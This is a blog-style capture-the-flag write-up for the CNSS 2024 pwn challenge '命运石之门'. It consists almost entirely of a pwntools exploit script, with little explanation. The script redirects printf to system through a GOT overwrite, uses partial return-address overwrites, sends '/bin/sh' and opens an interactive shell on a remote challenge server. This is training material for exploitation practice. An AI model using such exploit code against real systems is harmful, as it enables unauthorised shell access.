---
layout: post
title: "CNSS2024夏令营pwn方向'命运石之门'writeup"
date:   2024-1-27
tags: [tag1, tag2]
comments: true
author: xxx
---

# CNSS2024夏令营pwn '命运石之门' 题解

## **Step0 题目信息**
![pwn1.png](https://vip.helloimg.com/i/2024/08/31/66d284e2dd66c.png)
&emsp;初始分数为1000分
&emsp;
![pwn2.png](https://vip.helloimg.com/i/2024/08/31/66d284e82859a.png)
&emsp;如你所见，没有任何hint，从描述上也看不出所以然
&emsp;

## **Step1 文件检查**
### &emsp;附件:<br>&emsp;&emsp;attachment:[attachment](https://)
```python
from pwn import *

def debug(cmd=''):
    gdb.attach(io, cmd)
    pause()

context.log_level = "debug"
##io = process("./pwn")
io = remote("152.136.11.155", 10027)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

# datas
printf_got = elf.got["printf"] # 0x404028
##system_got = elf.got["system"]
system_plt = elf.plt["system"]
timeline_pid = 0x4012AB

# Dest = 0x4040B8
io.sendafter(b'Input the Destination:\n', p64(printf_got)) # Dest -> printf_got
sleep(0.05)

io.sendafter(b'Input the impact:', p8(0x40)) # printf_got -> system_got
payload = b'a'*0x18 + p8(0xab) # time = 0 ; call fork()
io.send(payload)
sleep(0.05)


io.sendafter(b'Input the Destination:\n', b'/bin/sh\0')
payload = b'a'*0x18 + p8(0xb5) # call fork()
##io.sendafter(b'Input the impact:', b's') # s
io.send(payload)
sleep(0.05)

payload = b'a'*0x18 + p8(0x48) # 0x401248 ret
##io.sendafter(b'Input the impact:', b's') # s
io.send(payload)
sleep(0.05)

io.interactive()

```

